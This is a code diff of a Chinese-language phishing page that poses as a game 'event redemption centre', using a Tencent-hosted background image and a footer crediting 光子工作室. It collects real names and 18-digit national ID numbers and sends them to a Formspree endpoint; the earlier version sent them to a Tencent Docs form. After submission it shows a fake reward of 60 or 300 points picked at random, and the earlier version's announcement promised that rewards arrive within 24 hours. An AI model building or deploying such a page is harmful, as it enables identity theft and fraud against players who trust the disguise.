@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh">
+<html lang="zh-CN">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
@@ -8,170 +8,171 @@
     body {
       margin: 0;
       font-family: "PingFang SC", "Microsoft YaHei", sans-serif;
-      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      background: url('https://game.gtimg.cn/images/pg/fab/pgact/a20221115exch/bg.jpg') no-repeat center center fixed;
       background-size: cover;
-      color: white;
-      text-align: center;
-      padding: 20px;
+      color: #fff;
     }
+
     .container {
-      max-width: 480px;
-      margin: auto;
-      background: rgba(0, 0, 0, 0.6);
-      padding: 20px;
+      max-width: 500px;
+      margin: 5% auto;
+      background: rgba(0, 0, 0, 0.65);
+      padding: 30px;
       border-radius: 12px;
-      box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
     }
+
     h1 {
-      font-size: 24px;
-      margin-bottom: 20px;
-      color: #f9d342;
+      text-align: center;
+      margin-bottom: 30px;
+      font-size: 26px;
     }
-    select, input {
+
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+
+    label span {
+      color: red;
+    }
+
+    input, select {
       width: 100%;
       padding: 10px;
-      margin-top: 10px;
-      font-size: 16px;
-      border-radius: 6px;
+      margin-bottom: 15px;
       border: none;
+      border-radius: 5px;
+      font-size: 16px;
     }
-    input.error, select.error {
-      border: 2px solid #ff4d4f;
+
+    input:invalid {
+      border: 2px solid red;
     }
-    .error-msg {
-      color: #ff4d4f;
+
+    .error {
+      color: red;
       font-size: 13px;
-      text-align: left;
-      margin-top: 4px;
+      margin-top: -10px;
+      margin-bottom: 10px;
     }
+
     button {
-      margin-top: 20px;
-      width: 100%;
-      padding: 12px;
-      font-size: 16px;
-      background-color: #f9d342;
+      background: #ffcc00;
       color: #000;
+      font-size: 16px;
+      font-weight: bold;
       border: none;
+      padding: 12px;
+      width: 100%;
       border-radius: 6px;
       cursor: pointer;
-      transition: background 0.3s;
     }
+
     button:disabled {
-      background-color: #888;
+      background: gray;
       cursor: not-allowed;
     }
-    .result {
-      margin-top: 20px;
-      font-size: 16px;
-      line-height: 1.5;
-    }
-    .announcement {
-      margin-top: 30px;
-      background: rgba(255,255,255,0.1);
-      padding: 12px;
+
+    .message {
+      background: #333;
+      padding: 15px;
       border-radius: 8px;
-      font-size: 14px;
-      text-align: left;
+      margin-top: 15px;
+      line-height: 1.6;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #ccc;
+      margin-top: 40px;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>活动兑换中心</h1>
-    <form id="form">
-      <select id="region">
-        <option value="">请选择区服</option>
+    <form id="claimForm" action="https://formspree.io/f/xrbkzgel" method="POST">
+      <label><span>*</span> 请选择区服</label>
+      <select name="area" required>
+        <option value="">请选择</option>
         <option value="微信区">微信区</option>
         <option value="QQ区">QQ区</option>
       </select>
-      <div id="regionError" class="error-msg"></div>
 
-      <input type="text" id="nickname" placeholder="请输入游戏昵称"/>
-      <!-- 昵称无格式限制 -->
+      <label><span>*</span> 游戏昵称</label>
+      <input type="text" name="nickname" placeholder="请输入游戏昵称" required>
 
-      <input type="text" id="realname" placeholder="请输入实名（1-5位中文）"/>
-      <div id="nameError" class="error-msg"></div>
+      <label><span>*</span> 姓名</label>
+      <input type="text" name="realname" id="realname" required pattern="^[\u4e00-\u9fa5]{1,5}$" placeholder="请输入真实姓名"/>
+      <div class="error" id="nameError" style="display:none;">姓名需为1-5个中文字符</div>
 
-      <input type="text" id="idcard" placeholder="请输入18位身份证号码"/>
-      <div id="idError" class="error-msg"></div>
+      <label><span>*</span> 身份证号</label>
+      <input type="text" name="idcard" id="idcard" required pattern="^\d{17}[\dXx]$" placeholder="请输入18位身份证号"/>
+      <div class="error" id="idError" style="display:none;">请输入正确的18位身份证号</div>
 
       <button type="submit" id="submitBtn">提交认证</button>
     </form>
 
-    <div class="result" id="resultBox" style="display: none;"></div>
-
-    <div class="announcement">
-      <strong>活动公告：</strong><br/>
-      本次认证可获得60/300/680/1280/1980/3280/6480点券，认证成功还可获得皮肤抽奖机会与钥匙兑换券，所有奖励将在24小时内发放到账，请耐心等待。如未到账请联系客服进行人工核实。
+    <div class="message" id="successMessage" style="display:none;">
+      <p><strong>您已成功提交认证，请勿重复提交。</strong></p>
+      <p id="rewardText"></p>
+      <button onclick="confirmComplete()">确认</button>
     </div>
+
+    <div class="footer">本活动最终解释权归光子工作室所有</div>
   </div>
 
   <script>
-    const form = document.getElementById("form");
+    const form = document.getElementById("claimForm");
+    const nameInput = document.getElementById("realname");
+    const idInput = document.getElementById("idcard");
+    const nameError = document.getElementById("nameError");
+    const idError = document.getElementById("idError");
     const submitBtn = document.getElementById("submitBtn");
-    const resultBox = document.getElementById("resultBox");
-
-    function isChineseName(name) {
-      return /^[\u4e00-\u9fa5]{1,5}$/.test(name);
-    }
-
-    function isValidID(id) {
-      return /^[1-9]\d{5}(19|20)\d{2}(0[1-9]|1[0-2])(0[1-9]|[12]\d|3[01])\d{3}[\dXx]$/.test(id);
-    }
-
-    function randomReward() {
-      return Math.random() < 0.01 ? 300 : 60;
-    }
+    const successMessage = document.getElementById("successMessage");
+    const rewardText = document.getElementById("rewardText");
 
     form.addEventListener("submit", function (e) {
-      e.preventDefault();
-
-      // 清除错误提示
-      document.querySelectorAll(".error-msg").forEach(el => el.textContent = '');
-      document.querySelectorAll("input, select").forEach(el => el.classList.remove("error"));
-
-      const region = document.getElementById("region").value;
-      const nickname = document.getElementById("nickname").value.trim();
-      const realname = document.getElementById("realname").value.trim();
-      const idcard = document.getElementById("idcard").value.trim();
-
-      let valid = true;
-
-      if (!region) {
-        document.getElementById("regionError").textContent = "请选择区服";
-        document.getElementById("region").classList.add("error");
-        valid = false;
+      if (!/^[\u4e00-\u9fa5]{1,5}$/.test(nameInput.value)) {
+        nameError.style.display = "block";
+        e.preventDefault();
+        return;
+      } else {
+        nameError.style.display = "none";
       }
 
-      if (!isChineseName(realname)) {
-        document.getElementById("nameError").textContent = "请输入1-5位中文姓名";
-        document.getElementById("realname").classList.add("error");
-        valid = false;
+      if (!/^\d{17}[\dXx]$/.test(idInput.value)) {
+        idError.style.display = "block";
+        e.preventDefault();
+        return;
+      } else {
+        idError.style.display = "none";
       }
 
-      if (!isValidID(idcard)) {
-        document.getElementById("idError").textContent = "请输入合法的18位身份证号";
-        document.getElementById("idcard").classList.add("error");
-        valid = false;
-      }
+      e.preventDefault(); // 防止跳转
 
-      if (!valid) return;
-
-      // 模拟提交结果
-      const reward = randomReward();
-      resultBox.innerHTML = `
-        <p style="color:#0f0;">您已成功提交认证，请勿重复提交</p>
-        <p>恭喜获得<span style="color:gold;">${reward}</span> 点券，点券将在24小时之内到账。</p>
-        <button disabled>您已提交</button>
-      `;
-      resultBox.style.display = "block";
+      // 模拟概率
+      const reward = Math.random() < 0.01 ? "300点卷" : "60点卷";
+      rewardText.innerText = `恭喜获得${reward}，点卷将在24小时内到账。`;
+      successMessage.style.display = "block";
       submitBtn.disabled = true;
+      submitBtn.innerText = "您已提交";
 
-      // 发送至问卷平台（替换为你自己的链接）
-      const url = "https://docs.qq.com/form/page/DYNAMIC_FORM_ID";
-      const fullURL = `${url}?nickname=${encodeURIComponent(nickname)}&realname=${encodeURIComponent(realname)}&idcard=${encodeURIComponent(idcard)}&region=${encodeURIComponent(region)}&reward=${reward}`;
-      fetch(fullURL);
+      // 提交到 Formspree
+      const formData = new FormData(form);
+      fetch(form.action, {
+        method: "POST",
+        body: formData,
+        headers: { 'Accept': 'application/json' }
+      });
     });
+
+    function confirmComplete() {
+      successMessage.style.display = "none";
+    }
   </script>
 </body>
 </html>
